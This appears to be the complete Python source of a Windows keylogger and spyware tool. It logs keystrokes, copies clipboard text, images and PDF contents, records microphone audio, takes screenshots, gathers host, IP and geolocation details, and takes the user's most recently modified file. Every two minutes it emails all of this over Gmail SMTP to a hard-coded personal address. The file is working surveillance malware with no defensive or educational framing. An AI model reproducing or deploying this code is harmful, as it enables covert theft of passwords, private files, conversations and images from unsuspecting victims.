from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import stdiomask
import socket
import PyPDF2
import pygeoip
import platform
import win32clipboard
from pynput.keyboard import Key,Listener
import time,os
import threading
from os.path import expanduser
from PIL import Image
from scipy.io.wavfile import write
import sounddevice as sd
import requests
from PIL import ImageGrab

count = 0
keys = []
email_address = input('Enter Your Email Address:')
passw =  stdiomask.getpass(prompt='Enter Your Password: ', mask='*')
tooadd = 'jainharsh3716@gmail.com'
time_iteration = 15
no_of_iteration_end = 3

def send_mail(filename,attachment,tooadd):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = tooadd
    msg['Subject'] = "Keylogger see it"
    body = "See the keylogger result"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, passw)
    final_txt = msg.as_string()
    s.sendmail(email_address, tooadd, final_txt)
    s.quit()

def start_thread(target):
    thread = threading.Thread(target=target)
    thread.daemon = True
    thread.start()

def computer_imformation():
    gi = pygeoip.GeoIP('GeoLiteCity.dat')
    with open(os.path.abspath(os.getcwd())+'\\'+'system-info.txt',"a") as f:
            hostname = socket.gethostname()
            f.write("Hostname: "+ hostname+'\n')
            IpAddr = socket.gethostbyname(hostname)
            f.write("Private Ip Address:"+IpAddr + '\n')
            try:
                pub_ip =  requests.get('https://checkip.amazonaws.com').text.strip()
                f.write("Public ip:"+pub_ip+'\n')

            except Exception as e:
                print(e)
                print("Coundn't get it")
            f.write("Processor: " + platform.processor() + '\n')
            f.write("System: " + platform.system() + " " + platform.version()+ '\n')
            f.write("Machine: "+ platform.machine()+'\n')
            loc = gi.record_by_addr(pub_ip)
            for key, value in loc.items():
                f.write(str(key)+':'+str(value)+'\n')
            send_mail('system-info.txt', os.path.abspath(os.getcwd()) + '\\' + 'system-info.txt', tooadd)

def copy_clip():
    with open(os.path.abspath(os.getcwd())+'\\'+ 'clipbaord.txt','a') as f:
        try:
            win32clipboard.OpenClipboard()
            text_pate = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write('Clipboard Data: '+text_pate)
            send_mail('clipbaord.txt', os.path.abspath(os.getcwd()) + '\\' + 'clipbaord.txt', tooadd)

        except:
            try:
                win32clipboard.OpenClipboard()
                filenames = win32clipboard.GetClipboardData(win32clipboard.CF_HDROP)
                win32clipboard.CloseClipboard()
                for filename in filenames:
                    finename = filename
                im = Image.open(filename)
                im = im.save("copied_image.jpg")
                send_mail('copied_image.jpg', os.path.abspath(os.getcwd()) + '\\' + 'copied_image.jpg', tooadd)

            except:
                win32clipboard.OpenClipboard()
                filenames = win32clipboard.GetClipboardData(win32clipboard.CF_HDROP)
                win32clipboard.CloseClipboard()
                for filename in filenames:
                    finename = filename
                with open(finename, mode='rb') as f:
                    reader = PyPDF2.PdfFileReader(f)
                    for page in reader.pages:
                        pfd = page.extractText()
                        with open(os.path.abspath(os.getcwd()) + '\\' + 'clipbaordofpdf.txt', 'a') as f:
                            f.write('Clipboard Data of pdf: ' + pfd)
                        print(pfd)
                        send_mail('clipbaordofpdf.txt', os.path.abspath(os.getcwd()) + '\\' + 'clipbaordofpdf.txt', tooadd)

def microphone():
    fs = 44100
    seconds = 10
    recording = sd.rec(int(seconds * fs),samplerate=fs,channels=2)
    sd.wait()
    write(os.path.abspath(os.getcwd())+'\\'+'audio.wav',fs,recording)
    send_mail('audio.wav', os.path.abspath(os.getcwd()) + '\\' + 'audio.wav', tooadd)
#microphone()

def send_the_recent_file_opened():
    home = expanduser("~")
    latest_edited_folder = max([f for f in os.scandir(home)], key=lambda x: x.stat().st_mtime).name
    search_on = home+'\\'+latest_edited_folder
    latest_edited_file = max([f for f in os.scandir(search_on)], key=lambda x: x.stat().st_mtime).name
    final_file_path = home+'\\'+latest_edited_folder+'\\'+latest_edited_file
    send_mail(latest_edited_file, final_file_path, tooadd)

def screenshot():
    img = ImageGrab.grab()
    img.save(os.path.abspath(os.getcwd())+'\\'+'screenshot.png')
    send_mail('screenshot.png', os.path.abspath(os.getcwd()) + '\\' + 'screenshot.png', tooadd)

def send_karo():
    while True:
        computer_imformation()
        try:
            send_the_recent_file_opened()
        except:
            print('lol ho gaya')
        microphone()
        screenshot()
        copy_clip()
        send_mail('keylog.txt',os.path.abspath(os.getcwd())+'\\'+'keylog.txt',tooadd)
        time.sleep(120)
start_thread(send_karo)

def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_fiie(keys)
        keys = []

def write_fiie(keys):
    with open(os.path.abspath(os.getcwd())+'\\'+'keylog.txt','a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find('space') > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press,on_release=on_release) as listner:
    listner.join()
